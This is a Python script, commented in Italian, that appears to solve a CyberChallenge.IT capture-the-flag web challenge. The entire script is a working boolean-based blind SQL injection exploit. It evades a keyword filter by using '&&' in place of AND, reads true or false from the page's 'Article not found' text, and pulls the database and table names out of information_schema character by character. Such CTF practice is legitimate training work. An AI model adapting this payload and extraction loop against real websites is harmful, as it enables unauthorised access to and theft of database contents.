import requests
import string
import sys

# Target
URL = "http://filtered.challs.cyberchallenge.it/post.php"

# Il nostro alfabeto: lettere, numeri e i caratteri speciali comuni nelle flag (CCIT{...})
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_-!"

def is_true(sql_condition):
    """
    Invia la condizione logica al database.
    Ritorna True se l'articolo viene caricato, False altrimenti.
    """
    # Il payload usa ' && ' al posto di ' AND ' per bypassare il filtro
    payload = f"4' && ({sql_condition})-- -"
    
    try:
        r = requests.get(URL, params={'id': payload}, timeout=5)
        # Se NON c'è la scritta "Article not found", significa che 1=1 (Vero)
        return "Article not found" not in r.text
    except Exception as e:
        print(f"\n[!] Errore di rete: {e}")
        return False

def extract_data(query_selettore, max_len=50):
    """
    Estrae una stringa dal database carattere per carattere.
    """
    result = ""
    for i in range(1, max_len + 1):
        char_found = False
        for char in CHARSET:
            # Costruiamo la query: estrai l'i-esimo carattere e confrontalo
            # Usiamo BINARY per rendere il confronto case-sensitive (utile per le flag!)
            test_query = f"SUBSTRING(({query_selettore}), {i}, 1) = BINARY '{char}'"
            
            if is_true(test_query):
                result += char
                # Stampa a schermo aggiornando la stessa riga (effetto hacker nei film 😎)
                sys.stdout.write(f"\r[+] Estrazione in corso: {result}")
                sys.stdout.flush()
                char_found = True
                break
        
        # Se abbiamo provato tutto il CHARSET e non abbiamo trovato nulla, 
        # significa che la stringa è finita.
        if not char_found:
            break
            
    print() # Nuova riga alla fine
    return result

if __name__ == "__main__":
    print("=== CYBERCHALLENGE EXPLOIT: WS_2.02 ===")
    
    # 1. Troviamo il nome del database corrente
    print("\n[*] 1. Estrazione nome Database...")
    db_name = extract_data("SELECT database()")
    
    # 2. Troviamo il nome della prima tabella in quel database
    print(f"\n[*] 2. Estrazione nome prima Tabella in '{db_name}'...")
    # information_schema.tables contiene i metadati di tutte le tabelle
    query_tabella = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT 0,1"
    table_name = extract_data(query_tabella)
    
    if table_name:
        print(f"\n[!!!] Tabella trovata: {table_name}")
        print("[*] Prossimo passo: estrarre le colonne o direttamente il contenuto!")
    else:
        print("\n[-] Nessuna tabella trovata o errore nell'Oracolo.")